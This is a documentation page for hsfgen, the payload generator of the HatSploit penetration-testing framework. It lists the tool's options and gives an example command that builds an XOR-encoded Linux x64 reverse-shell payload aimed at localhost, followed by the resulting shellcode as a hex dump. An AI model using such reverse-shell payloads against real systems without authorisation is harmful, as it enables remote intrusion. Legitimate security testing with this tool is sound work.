---
layout: default
title: Using hsfgen
parent: Getting started
nav_order: 9
---

HatSploit Framework has a native command-line payload generator called `hsfgen`. It is packaged by default with all other HatSploit utilities.

## Command-line Options

```
usage: hsfgen [-h] [-p PAYLOAD] [-e ENCODER] [--platform PLATFORM]
              [--arch ARCH] [-f FORMAT] [--formats] [--payloads] [--encoders]
              [--options option1=value1,option2=value2,...] [-i ITERATIONS]
              [-b BADCHARS] [--pack] [--implant] [-a] [-o OUTPUT]

Native HatSploit Framework advanced payload generator.

options:
  -h, --help            show this help message and exit
  -p PAYLOAD, --payload PAYLOAD
                        HatSploit payload.
  -e ENCODER, --encoder ENCODER
                        HatSploit encoder.
  --platform PLATFORM   Payload platform.
  --arch ARCH           Payload architecture
  -f FORMAT, --format FORMAT
                        Generate payload with custom format.
  --formats             List all formats.
  --payloads            List all payloads.
  --encoders            List all encoders.
  --options option1=value1,option2=value2,...
                        Add options to encoder/payload.
  -i ITERATIONS, --iterations ITERATIONS
                        Number of encoding iterations.
  -b BADCHARS, --badchars BADCHARS
                        Bad characters to omit (e.g. \x00).
  --pack                Pack payload as a compatible executable format.
  --implant             Output implant instead of complete payload.
  -a, --assembly        Show assembly for payloads.
  -o OUTPUT, --output OUTPUT
                        Output file to write payload to.
```

### Generate payload

Options `-p` and `-e` must be used to generate specific payload and encode it with the specific encoder.

* `-i`, `--iterations` - encode payload `N` times.
* `-b`, `--badchars` - omit bad characters duing the generation.
* `--options` - set options in payload and/or encoder.
* `--pack` - pack payload into executable file.
* `--implant` - generate only implant of the payload not the complete payload.
* `-f`, `--format` - select custom executable format.
* `-o`, `--output` - output result to the file.
* `-c`, `--custom` - specify custom directory with HatSploit payloads.

### Listing

* `--formats` - list all available executable formats (can be used with `--platform`).
* `--payloads` - list all available payloads (can be used with `--platform` and `--arch`).
* `--encoders` - list all available encoders (can be used with `--platform` and `--arch`).

## Examples

To generate simple `linux/x64/shell_reverse_tcp` payload and encode it with `x64/xor`:

```
hsfgen -p linux/x64/shell_reverse_tcp --options rhost=127.0.0.1,rport=8888 -e x64/xor
```

The output of this code will be:

```hsf
[*] Attempting to generate linux/x64/shell_reverse_tcp...
[i] Payload will be encoded with x64/xor
[*] Writing raw payload (112 bytes)...
00000000  48 31 c9 48 81 e9 b6 ff  ff ff 48 8d 05 ef ff ff |H1.H......H.....|
00000010  ff 48 bb 68 61 74 73 70  6c 36 34 48 31 58 27 48 |.H.hatspl64H1X'H|
00000020  2d f8 ff ff ff e2 f4 02  48 2c ea 1a 6e 69 5e 69 |-.......H,..ni^i|
00000030  3f 7b 76 38 fb 7e 8d 6a  61 56 cb b0 c4 34 5b 39 |?{v8.~.jaV...4[9|
00000040  29 fd 95 1a 7c 6c 5e 42  39 7b 76 1a 6f 68 7c 97 |)...|l^B9{v.oh|.|
00000050  af 1e 52 28 63 33 41 9e  0b 4f 2b e9 24 8d 1b 0a |..R(c3A..O+.$...|
00000060  08 1a 5c 03 04 36 67 20  e8 93 21 27 24 bf d2 67 |.....6g ..!'$..g|
00000070  64                                               |d               |
```

If you'd like to save it to the file call it with `-o`.

If you wish to pack it into `ELF` so it could be executed in the future, call `--pack` or `-f elf`.
